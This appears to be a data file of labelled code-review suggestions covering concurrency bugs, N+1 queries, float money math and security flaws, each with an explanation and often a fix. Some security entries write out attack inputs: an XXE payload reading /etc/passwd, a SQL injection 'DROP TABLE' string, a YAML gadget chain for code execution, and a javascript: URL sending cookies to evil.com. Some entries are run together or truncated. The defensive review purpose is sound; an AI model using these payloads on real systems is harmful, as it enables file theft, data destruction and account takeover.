suggestionsToEvaluate.suggestionContent: Data corruption from using `available` instead of `total` for stock update. `getStock()` computes `available = item.quantity - reservedQuantity` (line 25), so `currentStock.available` already has reservations subtracted. `bulkUpdateStock` then writes this net value back as the total `quantity` in the DB (line 80). Each execution permanently destroys reserved stock. Concrete scenario: product has DB quantity=100, 10 units reserved. `getStock` returns available=90. `bulkUpdateStock([{productId, quantity: 5}])` computes newQuantity=95, writes 95 to DB. The DB lost 5 units of total stock (should be 105).
suggestionsToEvaluate.oneSentenceSummary: Data corruption — uses available (net of reservations) instead of total quantity when writing to DB, permanently destroying reserved stock on each update

suggestionsToEvaluate.suggestionContent: Exponential time complexity from redundant subtree resolution. resolvePermissions recursively traverses parent roles (line 41-46) without memoization. In a role hierarchy with diamond inheritance (e.g., 'team-lead' inherits from 'developer' and 'reviewer', both inheriting from 'employee', which inherits from 'base-user'), shared ancestors are resolved multiple times. With depth D and branching factor B, worst case is O(B^D). A realistic enterprise RBAC with 6 levels and shared base roles resolves the same subtrees hundreds of times. Should memoize resolved results: add a Map<string, Set<string>> and return cached results for already-resolved roleIds.
suggestionsToEvaluate.oneSentenceSummary: Recursive permission resolution without memoization causes exponential recomputation on diamond inheritance hierarchies
suggestionsToEvaluate.label: performance

suggestionsToEvaluate.suggestionContent: TOCTOU race condition allows coupon over-redemption. The eligibility check on line 43 (currentRedemptions >= maxRedemptions) and the increment on line 51 are separate, non-atomic operations. Two concurrent requests for the same coupon with maxRedemptions=1 both read currentRedemptions=0, both pass the check, and both increment — resulting in currentRedemptions=2. suggestionsToEvaluate.suggestionContent: Time-of-check-to-time-of-use (TOCTOU) race condition in acquire_lock. Between the os.path.exists check on line 37 and the open(..., 'w') on line 48, another worker process can perform the same check, see no lock (or an expired lock), and also proceed to write. Both workers will believe they acquired the lock and process the same task concurrently. Concrete scenario: Worker A checks at T=0, file doesn't exist. Worker B checks at T=0.001, file still doesn't exist. Both proceed past line 41 and both write their lock data, with the second write silently overwriting the first. Both return True, causing duplicate task execution. Should use os.open with O_CREAT | O_EXCL flags for atomic file creation, or use fcntl.flock/msvcrt.locking for advisory locking.
suggestionsToEvaluate.oneSentenceSummary: TOCTOU race condition between os.path.exists check and file write allows two workers to both acquire the same task lock
suggestionsToEvaluate.label: bug

suggestionsToEvaluate.suggestionContent: Mutable default argument causes cross-call state pollution. The default value filters: Dict = {} on line 33 creates a single dict object at function definition time, shared across all calls that don't pass an explicit filters argument. Lines 49 and 54 mutate this shared dict by setting 'applied_min_price' and 'applied_max_price' keys. On the first call with min_price filter and no explicit filters dict: the default {} gets {'applied_min_price': True} added. On the second call with no filters argument: filters.get('min_price') reads from the same dict that now contains 'applied_min_price' from the previous call. While 'applied_min_price' alone won't trigger the price filter (since it checks 'min_price'), the accumulated state means debugging becomes impossible and any future code that checks 'applied_min_price' will see stale data. More critically, if any caller passes a filters dict with min_price, that dict is mutated in place, affecting the caller's variable unexpectedly.

suggestionsToEvaluate.suggestionContent: Late binding closure causes all scheduled jobs to use the last iteration's values. The run_job closure defined on line 40 captures job_name and handler by reference, not by value. Python closures bind to the variable name in the enclosing scope, not to the value at closure creation time. When any timer fires and executes run_job(), it reads the current value of job_name and handler, which are the values from the last loop iteration. Concrete scenario: schedule_jobs([{'name': 'cleanup', 'handler': cleanup_fn, 'interval_seconds': 60}, {'name': 'sync', 'handler': sync_fn, 'interval_seconds': 120}]). When the first timer fires after 60s, job_name is 'sync' and handler is sync_fn (the last iteration's values). The cleanup job never runs, and 'sync' runs on both timers' intervals. The log will show 'Running job: sync' for both firings.
suggestionsToEvaluate.oneSentenceSummary: Closure in loop captures loop variables by reference so all timers execute with the last iteration's job_name and handler

suggestionsToEvaluate.suggestionContent: Float arithmetic in financial calculation causes precision errors that compound across operations. The method uses float throughout (line 37: subtotal = 0.0, line 13: TAX_RATE = 0.0825). The pro-rating division on line 46 (line_total / 30) introduces repeating decimals that cannot be represented exactly in IEEE 754. Each subsequent multiplication on line 47, the subtotal accumulation on line 53, discount calculation on line 58, and tax computation on line 61 compounds the error. Concrete scenario: 3 line items at $33.33 each, pro-rated to 17 days. daily_rate = 33.33/30 = 1.1109999...99998 (float). line_total = 1.111 * 17 = 18.886999...97. After 3 items with 8.25% tax, cumulative rounding errors can produce discrepancies of several cents. For high-volume billing (thousands of invoices), these errors accumulate to material amounts. The final round() calls on lines 66-69 only mask the intermediate errors. Should use decimal.Decimal for all monetary calculations.

suggestionsToEvaluate.suggestionContent: N+1 query pattern executes 3N+1 database queries instead of 4. The loop on line 39 iterates over each team member and issues 3 separate queries per member (lines 40-44, 45-49, 50-54). For a team of 50 members, this executes 1 (members) + 150 (50*3) = 151 sequential database round trips. Each query also transfers full row data when only counts are needed (lines 58-61 just call len()). Should batch into 3 aggregate queries using IN clauses with the member IDs and GROUP BY, or use SQLAlchemy subqueries with func.count(). Additionally, lines 58-59 filter tasks in Python after loading all of them when the status filter could be pushed into the SQL query.

            .group_by(Review.reviewer_id)

        )

suggestionsToEvaluate.suggestionContent: Quadratic time complexity from string concatenation in loop. Python strings are immutable, so each += on lines 41-44 and 48-51 allocates a new string and copies the entire previous content. For N log entries with average line length L, the total copy cost is O(N^2 * L). With max_batch_size=10000 entries and typical log lines of ~200 bytes, the method copies approximately 10GB of memory in intermediate allocations. A batch of 10,000 entries that should take milliseconds will take several seconds and cause massive GC pressure. Should use a list to collect line strings and join them at the end: lines = [header]; lines.append(formatted_line); output = ''.join(lines). Alternatively, use io.StringIO for streaming writes.
suggestionsToEvaluate.oneSentenceSummary: Quadratic string concatenation in loop copies entire output on each iteration causing O(N^2) time and memory for large log exports
suggestionsToEvaluate.label: performance

suggestionsToEvaluate.suggestionContent: BigDecimal.equals() considers scale, so values that are numerically equal but have different scales will not match. On line 54, tierLabels.get(discountRate) uses HashMap.get which relies on BigDecimal.equals() and hashCode(). If the repository returns a BigDecimal with a different scale than what was used to populate the map (e.g., the DB returns 0.10 as scale 1 while the map key has scale 2, or vice versa), the lookup will fail. new BigDecimal("0.10").equals(new BigDecimal("0.1")) returns false because they have different scales (2 vs 1). This means a valid 10% discount will show tier "Custom" instead of "Silver". Similarly on line 59, discountRate.equals(new BigDecimal("0.0")) will fail if discountRate has scale 2 ("0.00") because new BigDecimal("0.0") has scale 1. The zero-discount check is bypassed, causing a zero discount to still be reported as a non-zero result. The tierLabels map should use a TreeMap with BigDecimal's natural ordering (which uses compareTo), and the zero check should use compareTo(BigDecimal.ZERO) == 0.

Lines 28-31 perform a non-atomic check: between sessions.get() returning null and putIfAbsent on line 38, another thread can execute the same sequence for the same userId. Both threads pass the null check, and both execute the expensive side effects on lines 33-35: generating a secure token, incrementing the counter, and logging to the audit service. Only one thread wins the putIfAbsent, but both have already performed the side effects. This results in wasted token generation, an inflated tokenCounter (line 34), and duplicate audit log entries (line 35). Under high concurrency during login storms, the token counter becomes unreliable for metrics and the audit log contains phantom sessions that were never actually used. suggestionsToEvaluate.suggestionContent: N+1 (and deeper) JPA lazy loading triggers cascading queries on every entity access in the stream. On line 26-27, findByOrderDateBetween fetches the Order entities (1 query). On line 30, order.getLineItems() triggers lazy loading of the @OneToMany line items collection for each order (N queries). On line 32, lineItem.getProduct() triggers lazy loading of the @ManyToOne Product entity for each line item (M queries). Then getProduct().getCategory() on the same line triggers another lazy load for the @ManyToOne Category entity (M more queries). suggestionsToEvaluate.suggestionContent: XML External Entity (XXE) injection vulnerability in the DocumentBuilderFactory configuration. On lines 31-33, the factory is created with setNamespaceAware(true) and setValidating(false), but external entity processing is not disabled. An attacker can submit XML containing a DTD with an external entity definition that reads arbitrary files from the server: <!DOCTYPE configuration [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> followed by <property key="test">&xxe;</property>. When the parser resolves &xxe; on line 49 via getTextContent(), the contents of /etc/passwd are placed into the value variable and stored in the database on line 58. The attacker then reads the config back to exfiltrate the file. Variants include SSRF via http:// URIs to scan internal networks, or denial of service via recursive entity expansion (billion laughs attack). Must disable external entities and DTDs on the factory: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true) and factory.setFeature("http://xml.org/sax/features/external-general-entities", false).
suggestionsToEvaluate.oneSentenceSummary: DocumentBuilderFactory without disabling external entities allows XXE attacks to read server files, perform SSRF, or cause denial of service

suggestionsToEvaluate.suggestionContent: Using java.util.Random instead of java.security.SecureRandom for security-sensitive token generation. On line 18, the random field is initialized with new Random(), which uses a linear congruential generator (LCG) with a 48-bit seed. On line 41, this predictable PRNG generates the password reset token bytes. java.util.Random's internal state can be fully reconstructed from observing just two consecutive output values. An attacker who observes or can trigger multiple password reset requests can predict the seed state and compute future tokens. Additionally, Random() with no argument seeds from System.nanoTime(), which has limited entropy on many platforms. Concrete attack: the attacker requests a reset for their own account, observes the token in the email link, then requests a reset for the victim's account. Since the Random state is deterministic after the first observation, the attacker computes the victim's token and uses it to reset the victim's password. Must use SecureRandom which draws from the OS entropy pool (e.g., /dev/urandom) and is cryptographically secure.

suggestionsToEvaluate.improvedCode: private final SecureRandom random = new SecureRandom();

suggestionsToEvaluate.suggestionContent: Using return inside a block (Proc) causes LocalJumpError or exits the enclosing method unexpectedly. In Ruby, blocks passed via & are Procs, not lambdas. On line 27, `return { success: false, ... }` inside the block does not return from the block -- it returns from the enclosing method configure_default_steps. When this block is later invoked via step[:handler].call(result) on line 49, the original method has already returned, so Ruby raises a LocalJumpError: unexpected return. The same issue exists on line 39. Even if the return happened during configure_default_steps execution (before the method returned), it would exit configure_default_steps early, preventing the remaining steps from being registered. Concrete scenario: calling execute with an out-of-stock order triggers the return on line 27 via .call, raising LocalJumpError. Must use next instead of return to exit a Proc, or convert the blocks to lambdas: handler = lambda { |order| ... }.

register_step('validate_inventory') do |order|
      out_of_stock = order.line_items.select { |li| li.product.stock_count < li.quantity }
      next { success: false, error: 'insufficient_stock', items: out_of_stock.map(&:product_id) } unless out_of_stock.empty?
      order
    end

suggestionsToEvaluate.suggestionContent: Using Time.now instead of Time.zone.now in a Rails application causes incorrect time comparisons when the server timezone differs from the configured application timezone. Time.now returns time in the server's OS timezone, while ActiveRecord stores and retrieves timestamps in the configured Rails timezone (usually UTC via config.active_record.default_timezone). On line 21, Time.now might be EST (-5h) while expires_at is stored as UTC, causing the query to select subscriptions that should not yet be processed (or miss ones that should). On line 34, last_renewed_at is stored with the wrong timezone. On line 38, the comparison between a UTC expires_at and a local Time.now may incorrectly expire or keep active subscriptions. On line 52, the trial time remaining calculation could be off by hours. Concrete scenario: server in US-East (UTC-5), Rails configured for UTC. A subscription expiring at 2024-01-15 03:00 UTC: Time.now at 1am EST = 2024-01-15 01:00 EST. The comparison treats this as 01:00 vs 03:00, showing 2h remaining. But in UTC it is 06:00 vs 03:00, actually 3h past expiry. Must use Time.zone.now or Time.current throughout.
suggestionsToEvaluate.existingCode:

      Time.now + GRACE_PERIOD_HOURS.hours,
      'active'
    )
suggestionsToEvaluate.improvedCode:
expiring = @repo.where(
      'expires_at <= ? AND status = ?',
      Time.current + GRACE_PERIOD_HOURS.hours,
      'active'
    )
suggestionsToEvaluate.oneSentenceSummary: Time.now uses server OS timezone instead of Rails configured timezone, causing incorrect expiration comparisons
suggestionsToEvaluate.label: bug

suggestionsToEvaluate.suggestionContent: SQL injection via string interpolation in ActiveRecord where clauses. Line 23 interpolates params[:q] directly into a SQL string: "name ILIKE '%#{params[:q]}%'". An attacker can send q="'; DROP TABLE products; --" to execute arbitrary SQL. The sort column on line 36 is properly whitelisted, further masking the interpolation issues elsewhere. Must use parameterized queries: results.where("name ILIKE ? OR description ILIKE ?", "%#{params[:q]}%", "%#{params[:q]}%") for the search, and results.where("tags @> ARRAY[?]::varchar[]", tag_list) or use ActiveRecord's array support for tags.

suggestionsToEvaluate.suggestionContent:
YAML.load on user-supplied content enables arbitrary Ruby object instantiation (Psych deserialization attack). On line 37, YAML.load(raw_content) processes the uploaded YAML with full object deserialization enabled by default. Ruby's Psych YAML parser supports tags like !!ruby/object, !!ruby/hash, and !!ruby/class that instantiate arbitrary Ruby objects during parsing. An attacker can craft a YAML file containing: --- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
io: &1 !ruby/object:Net::BufferedIO
io: !ruby/object:Gem::Package::TarReader::Entry
This chains gadgets to achieve remote code execution. The format validation on line 25, file size check on line 29, and key validation on line 46 all happen after YAML.load has already executed the malicious payload. The JSON.parse on line 39 is safe by comparison, making this inconsistency easy to overlook. Must use YAML.safe_load which only permits basic types (strings, numbers, arrays, hashes) and raises Psych::DisallowedClass for any Ruby object tags.
suggestionsToEvaluate.existingCode:
when 'yaml'
                YAML.load(raw_content)
suggestionsToEvaluate.improvedCode:
when 'yaml'
                YAML.safe_load(raw_content, permitted_classes: [], permitted_symbols: [], aliases: false)
suggestionsToEvaluate.oneSentenceSummary: YAML.load allows arbitrary Ruby object instantiation from user-uploaded YAML files enabling remote code execution

suggestionsToEvaluate.suggestionContent: Open redirect vulnerability allows phishing attacks by redirecting authenticated users to attacker-controlled sites. On line 31, params[:return_to] is used directly as the redirect destination without validating the host. An attacker crafts a login link: /login?return_to=https://evil-site.com/fake-dashboard. After the user successfully authenticates with valid credentials, they are redirected to evil-site.com which can mimic the application's dashboard to steal additional credentials, session tokens, or sensitive data. The attack is especially effective because the user just completed a legitimate login flow on the real site, establishing trust. The .presence call on line 31 only checks for blank strings, not malicious URLs. Line 17 also passes the unvalidated return_to through query parameters. Must validate that the redirect URL is a relative path or belongs to the application's host: URI.parse(destination).host.nil? || URI.parse(destination).host == request.host.
suggestionsToEvaluate.existingCode:
destination = params[:return_to].presence || dashboard_path
    redirect_to destination, notice: 'Signed in successfully'
suggestionsToEvaluate.improvedCode:
destination = safe_redirect_path(params[:return_to]) || dashboard_path
    redirect_to destination, notice: 'Signed in successfully'

  private

  def safe_redirect_path(url)
    return nil if url.blank?
    uri = URI.parse(url)
    return nil if uri.host.present? && uri.host != request.host
    url
  rescue URI::InvalidURIError
    nil
  end
suggestionsToEvaluate.oneSentenceSummary: Open redirect via unvalidated params[:return_to] allows phishing by redirecting authenticated users to attacker-controlled sites

suggestionsToEvaluate.suggestionContent: Every render of AuthProvider creates a new object literal for the context value prop (lines 56-62), a new login closure (line 40), and a new logout closure (line 50). Since React uses referential equality to decide whether to re-render context consumers, ALL components calling useAuth() will re-render every time AuthProvider re-renders — even if user and isLoading haven't changed. Any state change in a parent of AuthProvider cascades to the entire consumer tree. With dozens of useAuth consumers across the app, this causes expensive, unnecessary re-render cascades on every unrelated parent update. Should wrap login/logout in useCallback and the context value in useMemo.
suggestionsToEvaluate.oneSentenceSummary: Context value object and closures recreated on every render causes all useAuth consumers to re-render on any parent state change
suggestionsToEvaluate.label: performance

suggestionsToEvaluate.suggestionContent: Infinite render loop from unstable useEffect dependency. The filters object on lines 17-22 is created in the render body — a new object reference every render. useEffect depends on [filters] (line 44). On mount: render → new filters object → effect fires → setIsLoading(true) triggers re-render → new filters object (different reference) → effect fires again → infinite loop. The cancelled flag (line 25) prevents stale results from being set, but does not stop the loop because each render creates a new filters reference that triggers a new effect. Should either use useMemo to stabilize the filters object, or list the primitive values directly in the dependency array: [categoryId, query, sortField].
suggestionsToEvaluate.oneSentenceSummary: Inline object as useEffect dependency creates new reference every render causing infinite fetch loop

suggestionsToEvaluate.suggestionContent: useMemo on line 26 includes config and columns in its dependency array (line 45), but both are object/array props typically passed as inline literals from the parent (e.g., <DataGrid config={{ pageSize: 25, sortField: 'name', sortDirection: 'asc' }} ... />). Each parent render creates new object references for config and columns, causing useMemo to recompute on every render despite the actual values being unchanged. The expensive sort on line 27 and the array copy/slice/map pipeline run on every parent re-render, defeating the intended memoization. With 50,000 rows, this causes visible UI jank on every keystroke in sibling components. The parent should memoize config and columns, or DataGrid should use a deep comparison hook (e.g., use-deep-compare-memoize) instead of useMemo.

suggestionsToEvaluate.suggestionContent: XSS via javascript: protocol in user-provided URL. The component validates that url is not empty (line 11) and adds rel='noopener noreferrer' (line 22), but does not validate the URL protocol before setting it as href (line 19). An attacker can set their profile URL to 'javascript:document.location="https://evil.com/steal?"+document.cookie' which executes when any user clicks the link. React does not block javascript: protocol in href attributes. Should validate the protocol: const isValid = /^https?:\/\//i.test(url); and render a span instead of an anchor for invalid protocols.

suggestionsToEvaluate.suggestionContent:
Incomplete sanitizer allows XSS via event handler attributes. The sanitize function (lines 14-30) strips dangerous tags (script, iframe, etc.) but does not remove inline event handlers. An attacker can inject '' which passes sanitization (img is allowed when allowImages=true) and executes JavaScript when the broken image triggers onerror. Similarly, '
' passes through because div is not in BLOCKED_TAGS. Tag-based sanitization is fundamentally insufficient — should use a proper HTML sanitizer library (DOMPurify, sanitize-html) or strip all on* event handler attributes with a regex like /\son\w+\s*=/gi.
suggestionsToEvaluate.oneSentenceSummary: Tag-based HTML sanitizer misses event handler attributes (onerror, onmouseover, etc.) allowing XSS through allowed elements
